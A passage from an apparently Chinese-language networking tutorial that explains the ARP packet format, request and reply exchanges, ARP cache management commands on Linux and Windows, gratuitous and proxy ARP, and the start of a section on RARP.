class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ARP报文格式（28字节）：<br><br><span class="hljs-code"> 0                   1                   2                   3</span><br><span class="hljs-section"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|       Hardware Type           |       Protocol Type           |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|  HW Addr Len  | Proto Addr Len|          Operation            |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br>|                   Sender Hardware Address                     |<br><span class="hljs-section">|                        (6 bytes)                              |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br>|                   Sender Protocol Address                     |<br><span class="hljs-section">|                        (4 bytes)                              |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br>|                   Target Hardware Address                     |<br><span class="hljs-section">|                        (6 bytes)                              |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br>|                   Target Protocol Address                     |<br><span class="hljs-section">|                        (4 bytes)                              |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><br>字段说明：<br><br>Hardware Type (硬件类型, 16位):<br><span class="hljs-bullet">- </span>1 = 以太网<br><span class="hljs-bullet">- </span>6 = IEEE 802网络<br><span class="hljs-bullet">- </span>7 = ARCnet<br><br>Protocol Type (协议类型, 16位):<br><span class="hljs-bullet">- </span>0x0800 = IPv4<br><span class="hljs-bullet">- </span>与以太网类型字段相同<br><br>Hardware Address Length (硬件地址长度, 8位):<br><span class="hljs-bullet">- </span>以太网 = 6（字节）<br><br>Protocol Address Length (协议地址长度, 8位):<br><span class="hljs-bullet">- </span>IPv4 = 4（字节）<br><br>Operation (操作, 16位):<br><span class="hljs-bullet">- </span>1 = ARP请求（ARP Request）<br><span class="hljs-bullet">- </span>2 = ARP应答（ARP Reply）<br><span class="hljs-bullet">- </span>3 = RARP请求<br><span class="hljs-bullet">- </span>4 = RARP应答<br><br>Sender Hardware Address (发送方硬件地址, 6字节):<br><span class="hljs-bullet">- </span>发送方的MAC地址<br><br>Sender Protocol Address (发送方协议地址, 4字节):<br><span class="hljs-bullet">- </span>发送方的IP地址<br><br>Target Hardware Address (目标硬件地址, 6字节):<br><span class="hljs-bullet">- </span>请求时为全0或FF:FF:FF:FF:FF:FF<br><span class="hljs-bullet">- </span>应答时为目标MAC地址<br><br>Target Protocol Address (目标协议地址, 4字节):<br><span class="hljs-bullet">- </span>目标的IP地址<br></code></pre></td></tr></table></figure><h3 id="2-2-ARP请求和应答"><a href="#2-2-ARP请求和应答" class="headerlink" title="2.2 ARP请求和应答"></a>2.2 ARP请求和应答</h3><p><strong>ARP请求（ARP Request）</strong>：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs dns">场景：<br>主机<span class="hljs-keyword">A</span>（<span class="hljs-number">192.168.1.10</span>, MAC: <span class="hljs-number">11:11:11:11</span>:<span class="hljs-number">11</span>:<span class="hljs-number">11</span>）<br>想发送数据给<br>主机B（<span class="hljs-number">192.168.1.20</span>, MAC: 未知）<br><br>ARP请求流程：<br><br><span class="hljs-number">1</span>. 主机<span class="hljs-keyword">A</span>构造ARP请求包：<br>   ┌──────────────────────────────────┐<br>   │ 以太网头部                        │<br>   ├──────────────────────────────────┤<br>   │ 目标MAC: FF:FF:FF:FF:FF:FF (广播) │<br>   │ 源MAC: <span class="hljs-number">11:11:11:11</span>:<span class="hljs-number">11</span>:<span class="hljs-number">11</span>         │<br>   │ 类型: <span class="hljs-number">0</span>x0806 (ARP)               │<br>   ├──────────────────────────────────┤<br>   │ ARP报文                          │<br>   ├──────────────────────────────────┤<br>   │ 操作: <span class="hljs-number">1</span> (请求)                   │<br>   │ 发送方MAC: <span class="hljs-number">11:11:11:11</span>:<span class="hljs-number">11</span>:<span class="hljs-number">11</span>     │<br>   │ 发送方IP: <span class="hljs-number">192.168.1.10</span>           │<br>   │ 目标MAC: <span class="hljs-number">00:00:00:00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>       │<br>   │ 目标IP: <span class="hljs-number">192.168.1.20</span>             │<br>   └──────────────────────────────────┘<br><br><span class="hljs-number">2</span>. 广播发送到局域网<br>   - 所有主机都能收到<br>   - 目标MAC是广播地址<br><br><span class="hljs-number">3</span>. 局域网内所有主机接收：<br>   - 主机C: IP不是<span class="hljs-number">192.168.1.20</span>，忽略<br>   - 主机D: IP不是<span class="hljs-number">192.168.1.20</span>，忽略<br>   - 主机B: IP是<span class="hljs-number">192.168.1.20</span>，处理！<br></code></pre></td></tr></table></figure><p><strong>ARP应答（ARP Reply）</strong>：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">主机B收到ARP请求后：</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">1. 主机B构造ARP应答包：</span><br><span class="hljs-attribute">   ┌──────────────────────────────────┐</span><br><span class="hljs-attribute">   │ 以太网头部                        │</span><br><span class="hljs-attribute">   ├──────────────────────────────────┤</span><br><span class="hljs-attribute">   │ 目标MAC</span><span class="hljs-punctuation">:</span> <span class="hljs-string">11:11:11:11:11:11       │</span><br>   <span class="hljs-attribute">│ 源MAC</span><span class="hljs-punctuation">:</span> <span class="hljs-string">22:22:22:22:22:22         │</span><br>   <span class="hljs-attribute">│ 类型</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0806 (ARP)               │</span><br>   <span class="hljs-attribute">├──────────────────────────────────┤</span><br><span class="hljs-attribute">   │ ARP报文                          │</span><br><span class="hljs-attribute">   ├──────────────────────────────────┤</span><br><span class="hljs-attribute">   │ 操作</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2 (应答)                   │</span><br>   <span class="hljs-attribute">│ 发送方MAC</span><span class="hljs-punctuation">:</span> <span class="hljs-string">22:22:22:22:22:22     │</span><br>   <span class="hljs-attribute">│ 发送方IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.1.20           │</span><br>   <span class="hljs-attribute">│ 目标MAC</span><span class="hljs-punctuation">:</span> <span class="hljs-string">11:11:11:11:11:11       │</span><br>   <span class="hljs-attribute">│ 目标IP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">192.168.1.10             │</span><br>   └──────────────────────────────────┘<br><br>2. 单播发送给主机A<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">不是广播，直接发送</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">目标MAC是请求方的MAC</span><br><br>3. 主机A接收应答：<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">记录到ARP缓存</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">192.168.1.20 → 22:22:22:22:22:22</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">现在可以发送数据了！</span><br></code></pre></td></tr></table></figure><p><strong>完整交互流程</strong>：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs dns">主机<span class="hljs-keyword">A</span> (<span class="hljs-number">192.168.1.10</span>)               主机B (<span class="hljs-number">192.168.1.20</span>)<br><span class="hljs-number">11:11:11:11</span>:<span class="hljs-number">11</span>:<span class="hljs-number">11</span>                  <span class="hljs-number">22:22:22:22</span>:<span class="hljs-number">22</span>:<span class="hljs-number">22</span><br>      │                                   │<br>      │                                   │<br>      │  ARP Request (广播)                │<br>      │  &quot;谁是<span class="hljs-number">192.168.1.20</span>？               │<br>      │   我是<span class="hljs-number">192.168.1.10</span>&quot;                │<br>      │──────────────────────────────────&gt;│<br>      │                                   │<br>      │                          ┌────────┤<br>      │                          │ 检查IP │<br>      │                          │ 是我！ │<br>      │                          └────────┤<br>      │                                   │<br>      │  ARP Reply (单播)                  │<br>      │  &quot;我是<span class="hljs-number">192.168.1.20</span>                 │<br>      │   我的MAC是<span class="hljs-number">22:22:22:22</span>:<span class="hljs-number">22</span>:<span class="hljs-number">22</span>&quot;      │<br>      │&lt;──────────────────────────────────│<br>      │                                   │<br> ┌────┤                                   │<br> │缓存│                                   │<br> │映射│                                   │<br> └────┤                                   │<br>      │                                   │<br>      │  开始发送数据                      │<br>      │──────────────────────────────────&gt;│<br>      │                                   │<br><br>时间：约几毫秒<br></code></pre></td></tr></table></figure><h3 id="2-3-ARP缓存"><a href="#2-3-ARP缓存" class="headerlink" title="2.3 ARP缓存"></a>2.3 ARP缓存</h3><p><strong>什么是ARP缓存？</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ARP缓存 = ARP表 = ARP Cache<br><br>作用：<br><span class="hljs-bullet">-</span> 存储IP地址到MAC地址的映射<br><span class="hljs-bullet">-</span> 避免重复ARP请求<br><span class="hljs-bullet">-</span> 提高通信效率<br><br>内容：<br>┌─────────────────┬─────────────────────┬─────────┬──────┐<br>│   IP地址        │      MAC地址        │  类型   │ 剩余 │<br>├─────────────────┼─────────────────────┼─────────┼──────┤<br>│ 192.168.1.1     │ aa:bb:cc:dd:ee:ff   │ 动态    │ 120s │<br>│ 192.168.1.20    │ 11:22:33:44:55:66   │ 动态    │ 300s │<br>│ 192.168.1.100   │ 00:11:22:33:44:55   │ 静态    │  -   │<br>└─────────────────┴─────────────────────┴─────────┴──────┘<br><br>缓存类型：<br><br><span class="hljs-bullet">1.</span> 动态条目（Dynamic）<br><span class="hljs-bullet">   -</span> 通过ARP请求/应答获得<br><span class="hljs-bullet">   -</span> 有超时时间（通常2-20分钟）<br><span class="hljs-bullet">   -</span> 超时后删除，下次重新ARP<br><br><span class="hljs-bullet">2.</span> 静态条目（Static）<br><span class="hljs-bullet">   -</span> 手动添加<br><span class="hljs-bullet">   -</span> 永久有效（重启失效）<br><span class="hljs-bullet">   -</span> 不会被覆盖<br><span class="hljs-bullet">   -</span> 用于安全或特殊需求<br><br>工作流程：<br><br><span class="hljs-bullet">1.</span> 需要发送数据到某IP<br><span class="hljs-bullet">2.</span> 查找ARP缓存<br><span class="hljs-bullet">   -</span> 找到？使用缓存的MAC地址<br><span class="hljs-bullet">   -</span> 没找到？发送ARP请求<br><span class="hljs-bullet">3.</span> 收到ARP应答后更新缓存<br><span class="hljs-bullet">4.</span> 使用MAC地址发送数据<br></code></pre></td></tr></table></figure><p><strong>查看ARP缓存</strong>：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">Linux/macOS:<br>$ arp -a<br>? (<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>) at aa:bb:cc:dd:ee:ff <span class="hljs-string">[ether]</span> on eth0<br>? (<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">20</span>) at <span class="hljs-number">11</span>:<span class="hljs-number">22</span>:<span class="hljs-number">33</span>:<span class="hljs-number">44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">66</span> <span class="hljs-string">[ether]</span> on eth0<br><br>$ ip neigh show<br><span class="hljs-number">192.168.1.1</span> dev eth0 lladdr aa:bb:cc:dd:ee:ff REACHABLE<br><span class="hljs-number">192.168.1.20</span> dev eth0 lladdr <span class="hljs-number">11</span>:<span class="hljs-number">22</span>:<span class="hljs-number">33</span>:<span class="hljs-number">44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">66</span> STALE<br><br>Windows:<br>C:\&gt; arp -a<br>Interface: <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">10</span> --- 0x3<br>  Internet Address      Physical Address      Type<br>  <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>           aa-bb-cc-dd-ee-ff     dynamic<br>  <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">20</span>          <span class="hljs-number">11</span>-<span class="hljs-number">22</span>-<span class="hljs-number">33</span>-<span class="hljs-number">44</span>-<span class="hljs-number">55</span>-<span class="hljs-number">66</span>     dynamic<br><br>缓存状态（Linux）：<br>- REACHABLE: 可达，最近验证过<br>- STALE: 陈旧，超过有效期但未删除<br>- DELAY: 延迟，正在验证<br>- PROBE: 探测，发送请求验证<br>- FAILED: 失败，无法解析<br>- PERMANENT: 永久，静态条目<br></code></pre></td></tr></table></figure><p><strong>管理ARP缓存</strong>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs routeros">查看ARP缓存：<br>arp -a<span class="hljs-built_in"></span><br><span class="hljs-built_in">ip </span>neigh show<br><br>添加静态ARP：<br><span class="hljs-comment"># Linux</span><br>sudo arp -s 192.168.1.100 00:11:22:33:44:55<br>sudo<span class="hljs-built_in"> ip </span>neigh <span class="hljs-built_in">add</span> 192.168.1.100 lladdr 00:11:22:33:44:55 dev eth0<br><br><span class="hljs-comment"># Windows</span><br>arp -s 192.168.1.100 00-11-22-33-44-55<br><br>删除ARP条目：<br><span class="hljs-comment"># Linux</span><br>sudo arp -d 192.168.1.100<br>sudo<span class="hljs-built_in"> ip </span>neigh del 192.168.1.100 dev eth0<br><br><span class="hljs-comment"># Windows</span><br>arp -d 192.168.1.100<br><br>清空ARP缓存：<br><span class="hljs-comment"># Linux</span><br>sudo<span class="hljs-built_in"> ip </span>neigh flush all<br><br><span class="hljs-comment"># Windows</span><br>arp -d *<br><br>超时设置：<br><span class="hljs-comment"># Linux查看超时配置</span><br>sysctl net.ipv4.neigh.default.gc_stale_time<br><span class="hljs-comment"># 默认60秒</span><br><br><span class="hljs-comment"># 修改超时时间</span><br>sudo sysctl -w net.ipv4.neigh.default.<span class="hljs-attribute">gc_stale_time</span>=300<br></code></pre></td></tr></table></figure><hr><h2 id="3-免费ARP和代理ARP"><a href="#3-免费ARP和代理ARP" class="headerlink" title="3. 免费ARP和代理ARP"></a>3. 免费ARP和代理ARP</h2><h3 id="3-1-免费ARP（Gratuitous-ARP）"><a href="#3-1-免费ARP（Gratuitous-ARP）" class="headerlink" title="3.1 免费ARP（Gratuitous ARP）"></a>3.1 免费ARP（Gratuitous ARP）</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs markdown">免费ARP = Gratuitous ARP = GARP<br><br>定义：<br>主机发送ARP请求，查询自己的IP地址<br><br>格式：<br>┌──────────────────────────────────┐<br>│ 发送方IP: 192.168.1.10           │<br>│ 目标IP: 192.168.1.10（自己）     │<br>│ 目标MAC: FF:FF:FF:FF:FF:FF (广播) │<br>└──────────────────────────────────┘<br><br>特点：<br><span class="hljs-bullet">-</span> 查询的是自己的IP<br><span class="hljs-bullet">-</span> 广播发送<br><span class="hljs-bullet">-</span> 通常不期待响应<br><br>用途：<br><br><span class="hljs-bullet">1.</span> 检测IP冲突<br><span class="hljs-bullet">   -</span> 主机配置IP前发送GARP<br><span class="hljs-bullet">   -</span> 如果收到响应：IP冲突！<br><span class="hljs-bullet">   -</span> 如果无响应：IP可用<br><br>示例：<br>主机启动，配置192.168.1.10<br>→ 发送GARP：&quot;谁是192.168.1.10？&quot;<br>→ 如果局域网内有其他主机使用此IP<br>→ 该主机会响应<br>→ 检测到冲突，提示用户<br><br><span class="hljs-bullet">2.</span> 更新其他主机的ARP缓存<br><span class="hljs-bullet">   -</span> IP地址变更后<br><span class="hljs-bullet">   -</span> MAC地址变更后<br><span class="hljs-bullet">   -</span> 通知其他主机更新缓存<br><br>示例：<br>服务器更换网卡（MAC变了）<br>→ 发送GARP<br>→ 局域网内所有主机收到<br>→ 更新ARP缓存：192.168.1.10 → 新MAC<br><br><span class="hljs-bullet">3.</span> 高可用性/故障转移<br><span class="hljs-bullet">   -</span> 虚拟IP漂移<br><span class="hljs-bullet">   -</span> 主备切换<br><br>示例：<br>主服务器：VIP 192.168.1.100<br>→ 主服务器故障<br>→ 备服务器接管VIP<br>→ 备服务器发送GARP<br>→ 其他主机更新：192.168.1.100 → 备服务器MAC<br>→ 流量切换到备服务器<br><br><span class="hljs-bullet">4.</span> 链路层负载均衡<br><span class="hljs-bullet">   -</span> 多网卡绑定<br><span class="hljs-bullet">   -</span> VRRP/HSRP协议<br></code></pre></td></tr></table></figure><h3 id="3-2-代理ARP（Proxy-ARP）"><a href="#3-2-代理ARP（Proxy-ARP）" class="headerlink" title="3.2 代理ARP（Proxy ARP）"></a>3.2 代理ARP（Proxy ARP）</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs dns">代理ARP = Proxy ARP<br><br>定义：<br>路由器代替其他主机响应ARP请求<br><br>场景：<br>网络<span class="hljs-keyword">A</span>: <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br>   ↓<br>路由器R（启用代理ARP）<br>   ↓<br>网络B: <span class="hljs-number">192.168.2.0</span>/<span class="hljs-number">24</span><br><br>问题：<br>主机<span class="hljs-keyword">A</span> (<span class="hljs-number">192.168.1.10</span>) 认为 <span class="hljs-number">192.168.2.20</span> 在同一网络<br>（错误配置了子网掩码为 /<span class="hljs-number">16</span>）<br>→ 发送ARP广播：&quot;谁是<span class="hljs-number">192.168.2.20</span>？&quot;<br>→ <span class="hljs-number">192.168.2.20</span>在另一个网络，收不到<br><br>代理ARP解决：<br><span class="hljs-number">1</span>. 路由器R收到ARP请求<br><span class="hljs-number">2</span>. R检查：<span class="hljs-number">192.168.2.20</span>在网络B<br><span class="hljs-number">3</span>. R代替<span class="hljs-number">192.168.2.20</span>响应ARP<br><span class="hljs-number">4</span>. R返回：<span class="hljs-number">192.168.2.20</span>的MAC是路由器R的MAC<br><span class="hljs-number">5</span>. 主机<span class="hljs-keyword">A</span>发送数据到路由器R<br><span class="hljs-number">6</span>. 路由器R转发到<span class="hljs-number">192.168.2.20</span><br><br>工作流程：<br>主机<span class="hljs-keyword">A</span>                  路由器R                 主机B<br><span class="hljs-number">192.168.1.10</span>                                  <span class="hljs-number">192.168.2.20</span><br>      │                    │                       │<br>      │ ARP Request        │                       │<br>      │ &quot;谁是<span class="hljs-number">192.168.2.20</span>？&quot;│                       │<br>      │───────────────────&gt;│                       │<br>      │                    │                       │<br>      │              ┌─────┤                       │<br>      │              │检查 │                       │<br>      │              │路由 │                       │<br>      │              └─────┤                       │<br>      │                    │                       │<br>      │ ARP Reply          │                       │<br>      │ &quot;我是（路由器MAC）&quot;│                       │<br>      │&lt;───────────────────│                       │<br>      │                    │                       │<br>      │ 发送数据到路由器    │                       │<br>      │───────────────────&gt;│ 转发数据              │<br>      │                    │──────────────────────&gt;│<br>      │                    │                       │<br><br>优点：<br>✅ 简化网络配置<br>✅ 透明路由<br>✅ 兼容性好<br><br>缺点：<br>❌ 增加ARP流量<br>❌ 可能被滥用<br>❌ 难以排错<br><br>现代网络：<br>- 代理ARP较少使用<br>- 更推荐正确配置子网掩码<br>- 或使用路由协议<br></code></pre></td></tr></table></figure><hr><h2 id="4-RARP协议"><a href="#4-RARP协议" class="headerlink" title="4. RARP协议"></a>4. RARP协议</h2><h3 id="4-1-RARP概述"><a href="#4-1-RARP概述" class="headerlink" title="4.1 RARP概述"></a>4.1 RARP概述</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs markdown">RARP = Reverse Address Resolution Protocol<br>反向地址解析协议<br><br>作用：<br>与ARP相反，从MAC地址解析IP地址<br><br>使用场景：<br>无盘工作站启动<br><span class="hljs-bullet">-</span> 没有硬盘<br><span class="hljs-bullet">-</span> 不知道自己的IP地址<br><span class="hljs-bullet">-</span> 只知道自己的MAC地址（网卡ROM中）<br><br>工作流程：<br><span class="hljs-bullet">1.</span> 无盘工作站启动<br><span class="hljs-bullet">2.</span> 读取网卡MAC地址<br><span class="hljs-bullet">3.</span> 广播RARP请求：&quot;我的MAC是xx:xx:xx:xx:xx:xx，我的IP是多少？&quot;<br><span class="hljs-bullet">4.</span> RARP服务器查询配置表<br><span class="hljs-bullet">5.</span> RARP服务器响应：&quot;你的IP是192.168.1.100&quot;<br><span class="hljs-bullet">6.</span> 无盘工作站配置IP地址<br><span class="hljs-bullet">7.</span> 继续启动（通常使用TFTP下载操作系统）<br><br>报文格式：<br>与ARP相同，只是操作字段不同：<br><span class="hljs-bullet">-</span> Operation 